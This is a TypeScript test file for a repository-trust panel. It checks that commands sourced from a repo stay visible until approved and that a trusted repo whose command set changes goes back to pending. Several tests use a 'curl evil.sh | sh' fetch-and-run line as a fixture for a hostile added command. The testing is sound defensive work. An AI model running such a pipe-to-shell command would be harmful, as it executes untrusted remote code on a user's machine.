import { describe, expect, test } from 'bun:test'
import { commandsCollapsible, trustPanelState } from './repoTrust'
import { commandSetHash } from '../../../main/repo-trust'
import type { RepoTrustStatus } from './types'

const status = (over: Partial<RepoTrustStatus> = {}): RepoTrustStatus => ({
  repoRoot: '/repo',
  hash: 'abc',
  trusted: false,
  commands: ['widget: git status'],
  ...over,
})

describe('trustPanelState', () => {
  test('no repo-sourced commands is nothing to decide', () => {
    expect(trustPanelState(null, false)).toBe('none')
    expect(trustPanelState(status({ commands: [] }), false)).toBe('none')
    // Even a repo already recorded as trusted shows nothing if it runs nothing.
    expect(trustPanelState(status({ commands: [], trusted: true }), false)).toBe('none')
  })

  test('unapproved and unrefused is pending — the badge case', () => {
    expect(trustPanelState(status(), false)).toBe('pending')
  })

  test('approved is trusted, refused is blocked, and neither is pending', () => {
    expect(trustPanelState(status({ trusted: true }), false)).toBe('trusted')
    expect(trustPanelState(status(), true)).toBe('blocked')
  })
})

describe('commandsCollapsible', () => {
  test('only a trusted repo may hide its commands', () => {
    expect(commandsCollapsible('trusted')).toBe(true)
    for (const s of ['pending', 'blocked', 'none'] as const)
      expect(commandsCollapsible(s)).toBe(false)
  })

  test('a pending repo can never be collapsed — reading before approving is the gate', () => {
    expect(commandsCollapsible(trustPanelState(status(), false))).toBe(false)
  })
})

describe('a trusted repo that changes its commands goes back to pending', () => {
  // The end-to-end path the collapse must not break: main keys `trusted` on
  // (repoRoot, commandSetHash), so an edited widgets.json produces a different
  // hash, main reports trusted:false, and the panel re-expands.
  const approvedHash = commandSetHash(['widget: git status'])

  test('the same command set stays trusted and collapsible', () => {
    const live = commandSetHash(['widget: git status'])
    const s = status({ hash: live, trusted: live === approvedHash })
    expect(trustPanelState(s, false)).toBe('trusted')
    expect(commandsCollapsible(trustPanelState(s, false))).toBe(true)
  })

  test('an added command re-prompts and forces the commands open', () => {
    const live = commandSetHash(['widget: git status', 'widget: curl evil.sh | sh'])
    expect(live).not.toBe(approvedHash)
    const s = status({
      hash: live,
      trusted: live === approvedHash,
      commands: ['widget: git status', 'widget: curl evil.sh | sh'],
    })
    expect(trustPanelState(s, false)).toBe('pending')
    expect(commandsCollapsible(trustPanelState(s, false))).toBe(false)
  })

  test('the old denial does not carry over to a new command set either', () => {
    // `denied` is looked up by (repoRoot, hash) in main, so a new hash comes
    // back false — a rewritten repo asks again rather than staying muted.
    const live = commandSetHash(['widget: git status', 'widget: curl evil.sh | sh'])
    const deniedForOldHash = { [approvedHash]: true } as Record<string, boolean>
    expect(trustPanelState(status({ hash: live }), !!deniedForOldHash[live])).toBe('pending')
  })
})
